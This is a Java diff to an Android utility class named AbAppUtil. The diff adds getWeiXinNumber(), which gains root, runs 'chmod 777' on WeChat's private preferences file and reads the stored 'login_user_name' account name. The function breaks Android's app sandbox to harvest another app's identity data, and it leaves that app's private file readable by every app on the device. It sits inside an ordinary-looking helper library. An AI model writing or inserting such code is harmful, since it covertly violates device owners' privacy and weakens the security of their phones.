@@ -734,6 +734,10 @@ public class AbAppUtil {
 		Process process = null;
 		DataOutputStream os = null;
 		try {
+			File  file = new File(path);
+			if(!file.exists()){
+				return false;
+			}
 			String cmd = "chmod 777 " + path;
 			// 切换到root帐号
 			process = Runtime.getRuntime().exec("su");
@@ -1053,5 +1057,50 @@ public class AbAppUtil {
 		return null;
 	}
 		
+	/**
+	 * 
+	 * 获取WEIXIN号.
+	 * @return
+	 */
+	public static String getWeiXinNumber(Context context) {
+		String path = "/data/data/com.tencent.mm/shared_prefs/com.tencent.mm_preferences.xml";
+		getRootPermission(context);
+		File file = new File(path);
+		getRootPermission(path);
+		boolean flag = file.canRead();
+		String weixin = null;
+		if(flag){
+			try {
+				FileInputStream is = new FileInputStream(file);
+				XmlPullParser parser = Xml.newPullParser();
+				parser.setInput(is, "UTF-8");
+				int event = parser.getEventType();
+				while (event != XmlPullParser.END_DOCUMENT) {
+
+					switch (event) {
+					case XmlPullParser.START_DOCUMENT:
+						break;
+					case XmlPullParser.START_TAG:
+						if ("map".equals(parser.getName())) {
+						}
+						if ("string".equals(parser.getName())) {
+							String nameString = parser.getAttributeValue(null, "name");
+							if (nameString.equals("login_user_name")) {
+								weixin = parser.nextText();
+								return weixin;
+							}
+						}
+						break;
+					case XmlPullParser.END_TAG:
+						break;
+					}
+					event = parser.next();
+				}
+			}catch (Exception e) {
+				e.printStackTrace();
+			}
+		}
+		return null;
+	}
 
 }
